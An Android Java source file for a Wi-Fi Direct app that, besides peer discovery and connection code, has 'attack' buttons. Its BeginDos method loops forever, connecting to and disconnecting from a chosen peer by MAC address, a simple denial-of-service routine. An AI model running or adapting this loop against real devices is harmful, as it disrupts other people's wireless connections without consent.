package com.miko.zd.wifidirect.Activity;

import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.net.wifi.WpsInfo;
import android.net.wifi.p2p.WifiP2pConfig;
import android.net.wifi.p2p.WifiP2pDevice;
import android.net.wifi.p2p.WifiP2pDeviceList;
import android.net.wifi.p2p.WifiP2pInfo;
import android.net.wifi.p2p.WifiP2pManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import com.miko.zd.wifidirect.Adapter.MyAdapter;
import com.miko.zd.wifidirect.BroadcastReceiver.WifiDirectBroadcastReceiver;
import com.miko.zd.wifidirect.NetworkFlowUnity.NetworkSpeedUnity;
import com.miko.zd.wifidirect.R;
import com.miko.zd.wifidirect.Service.FileTransferService;
import com.miko.zd.wifidirect.Task.DataServerAsyncTask;
import com.miko.zd.wifidirect.Task.FileServerAsyncTask;
import com.miko.zd.wifidirect.Utils.Utils;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private final String TAG="wifi-direct";
    private String connectedDevice = "5a:7f:66:d5:06:2e";

    private Button conState;
    private Button iden;
    private Button discover;
    private Button stopdiscover;
    private Button stopconnect;
//    private Button sendpicture;
//    private Button senddata;
    private Button begrouppwener;
    private Button attack;
    private Button stop_attack;

//    private TextView speed;

    private RecyclerView mRecyclerView;
    private MyAdapter mAdapter;
    private List peers = new ArrayList();
    private List<HashMap<String, String>> peersshow = new ArrayList();

    private WifiP2pManager mManager;
    private WifiP2pManager.Channel mChannel;
    private BroadcastReceiver mReceiver;
    private IntentFilter mFilter;
    private WifiP2pInfo info;

    private HashMap<String,String> chosenDevice;

    private boolean isAttack = true;
    private boolean isConnect = false;

    private FileServerAsyncTask mServerTask;
    private DataServerAsyncTask mDataTask;

    private NetworkSpeedUnity networkSpeedUnity;

    Handler mHandler;

    private Utils utils;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initIntentFilter();
        initReceiver();
        initEvents();

    }
    @Override
    public void onStart(){
        super.onStart();
        SetButtonGone();
    }

    private void initView() {

        //speed = (TextView)findViewById(R.id.speed);

        conState = (Button)findViewById(R.id.conState);
        iden = (Button)findViewById(R.id.iden);
        begrouppwener= (Button) findViewById(R.id.bt_bgowner);
        stopdiscover = (Button) findViewById(R.id.bt_stopdiscover);
        discover = (Button) findViewById(R.id.bt_discover);
        stopconnect = (Button) findViewById(R.id.bt_stopconnect);
//        sendpicture = (Button) findViewById(R.id.bt_sendpicture);
//        senddata = (Button) findViewById(R.id.bt_senddata);
        //SetButtonGone();
        attack = (Button)findViewById(R.id.attack);
        stop_attack = (Button)findViewById(R.id.stop_attack);

        mRecyclerView = (RecyclerView) findViewById(R.id.recyclerview);

        mAdapter = new MyAdapter(peersshow);
        mRecyclerView.setAdapter(mAdapter);
        mRecyclerView.setLayoutManager(new LinearLayoutManager
                (this.getApplicationContext()));
    }

    private void initIntentFilter() {
        mFilter = new IntentFilter();
        mFilter.addAction(WifiP2pManager.WIFI_P2P_STATE_CHANGED_ACTION);
        mFilter.addAction(WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION);
        mFilter.addAction(WifiP2pManager.WIFI_P2P_CONNECTION_CHANGED_ACTION);
        mFilter.addAction(WifiP2pManager.WIFI_P2P_DISCOVERY_CHANGED_ACTION);
        mFilter.addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION);
    }

    //初始化wifip2pmanager，设置两个监听器
    private void initReceiver() {
        mHandler = new Handler(){
            public void handleMessage(Message mess){
                int i = mess.what;
                if(i == 1){
                    conState.setText("已连接");
                    isConnect = true;
                    //SetButtonVisible();
                }
                else if(i == 0){
                    //SetButtonGone();
                    conState.setText("未连接");
                    isConnect = false;
                }
                else if(i == 2){
                    iden.setText("GO");
                }
                else if(i == 3){
                    iden.setText("GC");
                }
                else if(i ==4){
                    DiscoverPeers();
                }
                else if(i == 20){
                    //String rate = String .valueOf(mess.obj);
                    //speed.setText(rate);
                }
            }
        };

        networkSpeedUnity = new NetworkSpeedUnity(this,mHandler);
        networkSpeedUnity.startShowNetwork();

        mManager = (WifiP2pManager) getSystemService(WIFI_P2P_SERVICE);
        mChannel = mManager.initialize(this, Looper.myLooper(), null);

        WifiP2pManager.PeerListListener mPeerListListerner = new WifiP2pManager.PeerListListener() {
            @Override
            public void onPeersAvailable(WifiP2pDeviceList peersList) {
                peers.clear();
                peersshow.clear();
                Collection<WifiP2pDevice> aList = peersList.getDeviceList();
                peers.addAll(aList);

                for (int i = 0; i < aList.size(); i++) {
                    WifiP2pDevice a = (WifiP2pDevice) peers.get(i);
                    HashMap<String, String> map = new HashMap<String, String>();
                    map.put("name", a.deviceName);
                    map.put("address", a.deviceAddress);
                    peersshow.add(map);
                }
                mAdapter = new MyAdapter(peersshow);
                mRecyclerView.setAdapter(mAdapter);
                mRecyclerView.setLayoutManager(new LinearLayoutManager
                        (MainActivity.this));
                mAdapter.SetOnItemClickListener(new MyAdapter.OnItemClickListener() {
                    @Override
                    public void OnItemClick(View view, int position) {
                        chosenDevice = peersshow.get(position);
                        CreateConnect(peersshow.get(position).get("address"),
                                peersshow.get(position).get("name"));

                    }

                    @Override
                    public void OnItemLongClick(View view, int position) {

                    }
                });
            }
        };

        WifiP2pManager.ConnectionInfoListener mInfoListener = new WifiP2pManager.ConnectionInfoListener() {

            @Override
            public void onConnectionInfoAvailable(final WifiP2pInfo minfo) {

                Log.i("xyz", "InfoAvailable is on");
                info = minfo;
//                TextView view = (TextView) findViewById(R.id.tv_main);
                if (info.groupFormed && info.isGroupOwner) {
//                    SetButtonGone();
                    Log.i("xyz", "owmer start");
                    iden.setText("GO");

//                    mServerTask = new FileServerAsyncTask(MainActivity.this, view);
//                    mServerTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
//
//                    mDataTask = new DataServerAsyncTask(MainActivity.this, view);
//                    mDataTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

                }else if(!info.isGroupOwner){
                    iden.setText("GC");
                }else{
                    iden.setText("");
                }
            }
        };
        mReceiver = new WifiDirectBroadcastReceiver(mManager, mChannel, this, mPeerListListerner, mInfoListener,mHandler);
    }

    private void initEvents() {

        discover.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                DiscoverPeers();
            }
        });
        begrouppwener.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                BeGroupOwener();
            }
        });

        stopdiscover.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                StopDiscoverPeers();
            }
        });
        stopconnect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                StopConnect();
            }
        });

        attack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                isAttack = true;
                BeginDos();
            }
        });

        stop_attack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                StopAttack();
            }
        });
        /*sendpicture.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                intent.setType("video/mp4");
                startActivityForResult(intent, 20);

            }
        });*/

        /*senddata.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent serviceIntent = new Intent(MainActivity.this,
                        DataTransferService.class);

                serviceIntent.setAction(DataTransferService.ACTION_SEND_FILE);

                InetAddress GOAddressInet = info.groupOwnerAddress;
                String GOAddress = GOAddressInet.getHostAddress();

                serviceIntent.putExtra(DataTransferService.EXTRAS_GROUP_OWNER_ADDRESS,
                        GOAddress);
                Log.d(TAG, "owenerip is " + info.groupOwnerAddress.getHostAddress());
                serviceIntent.putExtra(DataTransferService.EXTRAS_GROUP_OWNER_PORT,
                        8888);
                MainActivity.this.startService(serviceIntent);
            }
        });*/


        mAdapter.SetOnItemClickListener(new MyAdapter.OnItemClickListener() {
            @Override
            public void OnItemClick(View view, int position) {
                chosenDevice = peersshow.get(position);
                CreateConnect(peersshow.get(position).get("address"),
                        peersshow.get(position).get("name"));
            }

            @Override
            public void OnItemLongClick(View view, int position) {
            }
        });
    }

    private void BeginDos(){
        new Thread(new Runnable() {
            @Override
            public void run() {
                if(chosenDevice != null){
                    System.out.println(chosenDevice.get("address") + '\t' + chosenDevice.get("name"));
                }
                System.out.println("attack record");
                while (isAttack){
                    if(isConnect){
                        System.out.println("begin to stop");
                        StopConnect();
                        try{
                            Thread.sleep(1000);
                        }catch (Exception e){
                            System.out.println("delay exception!");
                        }
                    }else{
                        System.out.println("begin to connect");
                        isAttack = true;
                        CreateConnect(chosenDevice.get("address"),chosenDevice.get("name"));
                        StopDiscoverPeers();
                        try{
                            Thread.sleep(1000);
                        }catch (Exception e){
                            System.out.println("delay exception!");
                        }
                        DiscoverPeers();
                    }
                }
                System.out.println("thread begin");

                /*while(isAttack && chosenDevice!=null){


                }*/
            }
        }).start();

    }

    private void StopAttack(){
        isAttack = false;
    }

    private void SetButtonGone() {
//        sendpicture.setVisibility(View.GONE);
//        senddata.setVisibility(View.GONE);
    }

    private void BeGroupOwener() {
        mManager.createGroup(mChannel, new WifiP2pManager.ActionListener() {
            @Override
            public void onSuccess() {

            }

            @Override
            public void onFailure(int reason) {

            }
        });
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 20) {
            super.onActivityResult(requestCode, resultCode, data);
            Uri uri = data.getData();
            Intent serviceIntent = new Intent(MainActivity.this,
                    FileTransferService.class);

            serviceIntent.setAction(FileTransferService.ACTION_SEND_FILE);
            serviceIntent.putExtra(FileTransferService.EXTRAS_FILE_PATH,
                    uri.toString());

            serviceIntent.putExtra(FileTransferService.EXTRAS_GROUP_OWNER_ADDRESS,
                    info.groupOwnerAddress.getHostAddress());
            serviceIntent.putExtra(FileTransferService.EXTRAS_GROUP_OWNER_PORT,
                    8988);
            MainActivity.this.startService(serviceIntent);
        }
    }

    private void StopConnect() {
        //SetButtonGone();
        mManager.removeGroup(mChannel, new WifiP2pManager.ActionListener() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onFailure(int reason) {

            }
        });

        DiscoverPeers();
    }

    /*A demo base on API which you can connect android device by wifidirect,
    and you can send file or data by socket,what is the most important is that you can set
    which device is the client or service.*/

    private void CreateConnect(String address, final String name) {
        //System.out.println(address);
        WifiP2pDevice device;
        WifiP2pConfig config = new WifiP2pConfig();
        Log.d(TAG, address);

        config.deviceAddress = address;
        /*mac地址*/

        config.wps.setup = WpsInfo.PBC;
        Log.d(TAG, "MAC IS " + address);

        mManager.connect(mChannel, config, new WifiP2pManager.ActionListener() {

            @Override
            public void onSuccess() {
                System.out.println("connect success");
            }

            @Override
            public void onFailure(int reason) {
                System.out.println("connect failed");

            }
        });
        //Toast.makeText(this,"已连接",Toast.LENGTH_SHORT).show();
    }

    private void StopDiscoverPeers() {
        mManager.stopPeerDiscovery(mChannel, new WifiP2pManager.ActionListener() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onFailure(int reason) {


            }
        });
    }



    private void SetButtonVisible() {
//        sendpicture.setVisibility(View.VISIBLE);
//        senddata.setVisibility(View.VISIBLE);
    }




    private void DiscoverPeers() {
        mManager.discoverPeers(mChannel, new WifiP2pManager.ActionListener() {
            @Override
            public void onSuccess() {
            }

            @Override
            public void onFailure(int reason) {
            }
        });
    }



    @Override
    protected void onResume() {
        super.onResume();
        registerReceiver(mReceiver, mFilter);
    }

    @Override
    public void onPause() {
        super.onPause();
        Log.i("xyz", "hehehehehe");
        unregisterReceiver(mReceiver);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        StopConnect();
    }

    public void ResetReceiver() {

        unregisterReceiver(mReceiver);
        registerReceiver(mReceiver, mFilter);

    }
}
